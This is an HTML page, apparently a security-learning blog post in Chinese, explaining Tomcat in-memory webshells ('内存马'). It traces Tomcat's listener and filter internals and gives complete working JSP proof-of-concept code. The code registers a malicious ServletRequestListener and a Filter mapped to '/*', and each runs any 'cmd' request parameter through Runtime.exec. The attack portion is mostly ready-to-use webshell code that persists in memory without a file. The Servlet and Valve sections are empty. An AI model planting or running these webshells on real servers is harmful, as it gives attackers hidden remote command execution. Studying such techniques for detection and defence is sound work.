@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Tomcat内存马 - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Tomcat内存马 - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/07/17/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-07-16T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-07-17T00:00:00+08:00">
+      July 17, 2025
+    </time>
+    
+
+    <h1 class="title">Tomcat内存马</h1>
+  </div>
+
+  <div class="content">
+    <p>前置知识:<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p>
+<h2 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h2><p>利用的是ServletRequestListener</p>
+<p>ServletRequestListener是用来监听ServletRequest对象的，每从客户端发送一次请求就会生成一个ServletRequestListener。当我们访问任意资源的时候都会触发ServletRequestListener#requestInitialized()。</p>
+<p>一个恶意的listener</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171627695.png" alt="image-20250717162733544"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171628487.png" alt="image-20250717162834371"></p>
+<p>如何将这个恶意的listener注册进远程服务器呢？</p>
+<p>查看一下调用栈</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171630583.png" alt="image-20250717163037506"></p>
+<p>进入StandardContext#fireRequestInitEvent</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171631502.png" alt="image-20250717163145384"></p>
+<p>listener是由instance强转得来，instance属于instances[],instances[]&#x3D;getApplicationEventListeners(),所以如果instances中存在恶意的listener就能成功触发恶意的requestInitialized.</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171633406.png" alt="image-20250717163347364"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171635933.png" alt="image-20250717163533868"></p>
+<p>StandardContext中有个addApplicationEventListener()</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171639914.png" alt="image-20250717163925856"></p>
+<p>所以我们要获取StandardContext实例</p>
+<p>在StandardHostValve#invoke方法中可以看到它通过request.getContext()来获取StandardContext实例。</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171642010.png" alt="image-20250717164220895"></p>
+<p>JSP中内置了request对象,payload如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>另一种获取方式</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>完整POC</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>在Servlet容器中doFilter()是由Filterchain实现的</p>
+<p><img src="https://goodapple.top/wp-content/uploads/2022/05/image.png" alt="img"></p>
+<p>doFilter调用栈</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171706267.png" alt="image-20250717170615220"></p>
+<p>跟进ApplicationFilterChain#internalDoFilter</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171831768.png" alt="image-20250717183121472"></p>
+<p>filter是由filterconfig获取的，每一个filter都有一个对应的filterconfig,保存着filter的一些配置信息，具体的可以去看看最下面的参考文章。</p>
+<p>向上追踪调用栈进入StandWrapperValve#invoke</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507171834873.png" alt="image-20250717183416679"></p>
+<p>进入createFilterChain(除去一些不重要的判断，以下是省略版源码)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Request dispatcher in use</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line"> </span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            </span><br><span class="line">            ...</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            ...</span><br><span class="line"> </span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Return the completed filter chain</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从servlet中获取standardcontext,从standardcontext中获取filtermaps,再根据filtermaps中的servletname从standardcontext中获取filterconfig,所以context中的filtermap和filterconfig都要改。</p>
+<p>跟进addFilter</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507172327584.png" alt="image-20250717232745493"></p>
+<p>filterConfig参数被成功添加进去,下面三张图分别是standardcontext中filterconfig,filterdef,filtermap对应的属性</p>
+<p>filterconfig</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507180840342.png" alt="image-20250718084025248"></p>
+<p>filterdef存放着filter的定义，如filtername,filterclass之类，对应的是web.xml中的filter标签</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507180844086.png" alt="image-20250718084426031"></p>
+<p>filtermaps,用array存储各filter路径映射信息，对应的是web.xml中的filter-mapping</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span><span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507180909154.png" alt="image-20250718090935095"></p>
+<p>根据上方分析的createfilterchain的逻辑，我们要把恶意filter添加进standardcontext中的filtermaps和filterconfigs中。并且在最开始的internalDoFilter中可以看到Filter filter &#x3D;  filterconfig.getFilter(),所以要把filter封装进filterconfig中</p>
+<p>又因为getFilter()会调用filterDef.getFilterClass(),所以要把filterDef封装进filterconfig中</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507180935858.png" alt="image-20250718093539768"></p>
+<h3 id="动态注册filter"><a href="#动态注册filter" class="headerlink" title="动态注册filter"></a>动态注册filter</h3><p>首先要获取standardcontext,因为创建filterchain时用的filterconfig,filterdef,filtermap都是从它里面获取的。</p>
+<p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
+<p>Tomcat在启动时会为每个Context创建一个ServletContext,通过其属性我们可以获得StandardContext实例</p>
+<p>POC</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问jsp文件后再访问任意路由即可实现rce</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507181043119.png" alt="image-20250718104257167"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507181044099.png" alt="image-20250718104414986"></p>
+<p>剩下两种以后碰见了再说吧</p>
+<h2 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h2><h2 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h2><p>参考：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355#leftbar_tab_catalog">Java安全学习——内存马 - 枫のBlog</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/09/10/%E6%B5%85%E5%AD%A6RMI/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">浅学RMI</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/07/07/CakePHP-POP%E9%93%BE/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">CakePHP-POP链</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2025 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
